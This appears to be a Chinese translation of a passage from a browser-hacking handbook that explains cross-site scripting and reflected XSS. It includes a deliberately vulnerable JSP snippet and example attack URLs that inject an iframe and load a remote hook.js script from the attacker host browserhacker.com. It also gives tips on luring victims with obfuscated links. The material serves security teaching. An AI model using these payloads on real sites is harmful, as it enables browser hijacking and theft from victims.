
你拥有众多方法可以控制目标浏览器。这得益于互联网的爆炸性增长、现代浏览器的复杂性、可动态执行的语言数量以及信任模型的混乱。

本章的其余部分讨论了多种控制发起方法，但你不应将它们视为完整的集合。浏览器的快速变化很可能继续为你提供不同的选项。

## 使用跨站脚本攻击

在 1995 年 JavaScript 被引入 Netscape Navigator 之前，网页内容主要是静态 HTML。如果网站想要更改任何内容，用户通常需要点击链接，这会触发全新的 HTTP 请求/响应过程。这显然在等待某种动态语言。

然后，当然，JavaScript 到来了。动态语言被引入浏览器后不久，首批恶意代码注入案例就被报告。

最早的报告案例之一是由卡内基梅隆大学计算机应急响应团队协调中心（CERT/CC）于 2000 年 2 月报告的。CERT 安全通报 CA-2000-022 描述了恶意 HTML 标签或脚本的 inadvertent（意外）包含以及这些内容如何通过执行恶意代码影响用户。最初的恶意活动示例包括：

*   Cookies 中毒

*   泄露敏感信息

*   违反基于来源的安全策略

*   修改网页表单

*   曝光 SSL 加密内容

虽然最初的通报仅在 passing（略过）时提到“跨站”脚本，但它后来被称为 Cross-site Scripting（XSS）。为了避免与层叠样式表（Cascading Style Sheets）混淆，安全行业也称其为 XSS。随着时间的推移，Cross-site Scripting（即 XSS）已被证明是一种极为普遍的攻击，原因是网站代码中存在漏洞。

总体而言，XSS 发生在不受信任的内容被处理后被浏览器视为受信任并渲染时。如果该内容包含 HTML、JavaScript、VBScript 或其他任何动态内容，浏览器可能会执行不受信任的代码。

一个典型场景是：如果 Google App Store 存在 XSS 漏洞，攻击者可能诱骗用户安装恶意 Chrome 扩展程序。这在野外已经发生，并由 Jon Oberheide 在 2011 年演示。Oberheide 展示了 Android Web Market（当时的名称）中 XSS 漏洞的利用过程。当受害者执行该漏洞时，攻击会在其设备上安装任意应用程序及任意权限。4

XSS 有不同的分类，但广义上，它们影响浏览器/服务器关系的两个方面。传统的 Reflected XSS 和 Persistent XSS 与服务器端实现缺陷有关，而 DOM XSS 和 Universal XSS 则利用客户端漏洞。

当然，你甚至可以设想一种混合情况：一部分缺陷位于客户端，另一部分位于服务器。单独来看，它们可能不是安全问题，但合起来会形成 XSS 漏洞。

与安全的许多其他领域一样，你很可能会看到这些灰色边界随着更多攻击方法被发现而不断模糊。不过，为了历史和教育的优势，本文将使用以下传统的宽泛 XSS 分类。

### Reflected Cross-site Scripting

Reflected XSS 缺陷可能是发现的最常见的 XSS 形式。Reflected XSS 发生在将不受信任的用户数据提交到 Web 应用，然后立即在响应中回显该数据，从而将不受信任的内容“反射”到页面中。浏览器认为代码来自 Web 服务器，认为其安全，于是执行它。

大多数 XSS 缺陷都受 Same Origin Policy（同源策略）的约束。这种漏洞发生在服务器端代码中。下面是一段示例的脆弱 JSP 代码：

<%
 String userId = request.getParameter("user");
%>
Your User ID is <%= userId %>

这段代码从请求中获取 user 参数并直接将其内容回显到响应中。利用此漏洞可能非常简单，例如访问 http://browservictim.com/userhome.jsp?user=<iframe%20src=http://browserhacker.com/></iframe>。渲染后，这将在页面中包含指向 browserhacker.com 的 IFrame。

利用同一漏洞引入远程 JavaScript 到浏览器，可以通过诱骗目标访问 http://browservictim.com/userhome.jsp?user=<script%20src=http://browserhacker.com/hook.js></script>。当该 URL 被 Web 应用处理时，它会在 HTML 中返回 <script> 块。浏览器在接收这些 HTML 后，会识别 <script> 块并加载远程 JavaScript，随后在易受影响的源域上下文中执行它。

正如本章后面将发现，成功利用这些 Web 应用弱点可能需要一定的社交工程。例如，你可能需要提供一个缩短或混淆的 URL，或使用其他方法诱骗用户访问你构建的 URL。
